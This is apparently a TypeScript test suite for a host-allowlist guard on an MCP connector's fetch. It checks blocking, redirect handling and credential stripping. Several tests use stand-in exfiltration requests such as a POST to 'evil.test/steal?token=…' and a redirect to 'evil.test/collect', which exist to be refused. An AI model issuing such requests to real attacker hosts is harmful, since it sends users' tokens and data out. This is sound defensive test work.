/**
 * The `network:` grant on an MCP connector's fetch (#642; PLG-04): with `allowedHosts`, a request to a host the
 * connector plugin was not granted never leaves, and the error names the scope — not the URL's path, query or any
 * credential. A granted host goes through untouched.
 */
// @vitest-environment node
import { WebStandardStreamableHTTPServerTransport } from '@modelcontextprotocol/sdk/server/webStandardStreamableHttp.js';
import { McpNetworkError, guardFetch, mcpHostAllowed, openMcpConnector, type FetchLike } from '@agentic/mcp';
import { fixtureServer } from '../fixtures/sdk-server';

const TOKEN = 'tok-77aa-SECRET';

async function sdkFetch() {
    const server = fixtureServer();
    const transport = new WebStandardStreamableHTTPServerTransport({ sessionIdGenerator: () => crypto.randomUUID(), enableJsonResponse: true });
    await server.connect(transport);
    const hosts: string[] = [];
    const fetch: FetchLike = async (input, init) => {
        const request = new Request(String(input), init);
        hosts.push(new URL(request.url).host);
        return transport.handleRequest(request);
    };
    return { fetch, hosts, close: () => server.close() };
}

describe('network: grants on the MCP fetch (#642)', () => {
    it('matches a grant by host with its port, or by hostname', () => {
        expect(mcpHostAllowed(['mcp.test'], new URL('https://mcp.test/mcp'))).toBe(true);
        expect(mcpHostAllowed(['mcp.test:8443'], new URL('https://mcp.test:8443/mcp'))).toBe(true);
        expect(mcpHostAllowed(['mcp.test'], new URL('https://mcp.test:8443/mcp'))).toBe(true);
        expect(mcpHostAllowed(['mcp.test'], new URL('https://evil.test/mcp'))).toBe(false);
        expect(mcpHostAllowed([], new URL('https://mcp.test/mcp'))).toBe(false);
    });

    it('guardFetch refuses a host not granted before anything is sent, naming only the scope', async () => {
        let sent = 0;
        const fetch = guardFetch(async () => {
            sent++;
            return new Response('ok');
        }, ['api.github.com']);
        const failure = await fetch('https://evil.test/steal?token=abc123', { method: 'POST' }).then(
            () => undefined,
            (e: unknown) => e
        );
        expect(failure).toBeInstanceOf(McpNetworkError);
        expect((failure as McpNetworkError).scope).toBe('network:evil.test');
        expect((failure as McpNetworkError).code).toBe('network_not_granted');
        expect((failure as Error).message).toContain('network:evil.test is not granted');
        expect((failure as Error).message).not.toContain('abc123');
        expect((failure as Error).message).not.toContain('/steal');
        expect(sent).toBe(0);
        expect(await (await fetch('https://api.github.com/mcp')).text()).toBe('ok');
        expect(sent).toBe(1);
    });

    it('openMcpConnector with its host granted opens as before', async () => {
        const s = await sdkFetch();
        const opened = await openMcpConnector({ id: 'acme', url: 'http://mcp.test/mcp', bearer: TOKEN, fetch: s.fetch, allowedHosts: ['mcp.test'] });
        expect(opened.toolNames).toContain('acme__weather');
        await opened.close();
        await s.close();
    });

    it('openMcpConnector with its host revoked fails with McpNetworkError and never reaches the server', async () => {
        const s = await sdkFetch();
        const failure = await openMcpConnector({ id: 'acme', url: 'http://mcp.test/mcp', bearer: TOKEN, fetch: s.fetch, allowedHosts: ['other.test'] }).then(
            () => undefined,
            (e: unknown) => e
        );
        expect(failure).toBeInstanceOf(McpNetworkError);
        expect((failure as Error).message).toBe("network:mcp.test is not granted to this connector: the workspace owner can grant it on the connector's plugin page");
        expect((failure as Error).message).not.toContain(TOKEN);
        expect(s.hosts).toEqual([]);
        await s.close();
    });
    it('guardFetch checks every redirect hop: a granted server redirecting to a host not granted reaches nothing there', async () => {
        const seen: string[] = [];
        const fetch = guardFetch(async (input, init) => {
            const url = new URL(String(input));
            seen.push(`${init?.method ?? 'GET'} ${url.host}${url.pathname} ${init?.redirect}`);
            if (url.host === 'api.github.com' && url.pathname === '/mcp') return new Response(null, { status: 307, headers: { location: 'https://evil.test/collect' } });
            return new Response('ok');
        }, ['api.github.com']);
        const failure = await fetch('https://api.github.com/mcp', { method: 'POST', body: '{}' }).then(
            () => undefined,
            (e: unknown) => e
        );
        expect(failure).toBeInstanceOf(McpNetworkError);
        expect((failure as McpNetworkError).scope).toBe('network:evil.test');
        expect(seen).toEqual(['POST api.github.com/mcp manual']);
    });

    it('guardFetch follows a redirect to a granted host, dropping the credential when the origin changes', async () => {
        const seen: { host: string; method: string; auth: string | null; body: unknown }[] = [];
        const fetch = guardFetch(async (input, init) => {
            const url = new URL(String(input));
            seen.push({ host: url.host, method: init?.method ?? 'GET', auth: new Headers(init?.headers).get('authorization'), body: init?.body });
            if (url.pathname === '/a') return new Response(null, { status: 307, headers: { location: '/b' } });
            if (url.pathname === '/b') return new Response(null, { status: 302, headers: { location: 'https://mirror.test/c' } });
            return new Response('done');
        }, ['api.github.com', 'mirror.test']);
        const response = await fetch('https://api.github.com/a', { method: 'POST', body: 'x', headers: { authorization: 'Bearer t' } });
        expect(await response.text()).toBe('done');
        expect(seen).toEqual([
            { host: 'api.github.com', method: 'POST', auth: 'Bearer t', body: 'x' },
            { host: 'api.github.com', method: 'POST', auth: 'Bearer t', body: 'x' },
            { host: 'mirror.test', method: 'GET', auth: null, body: undefined }
        ]);
    });
});
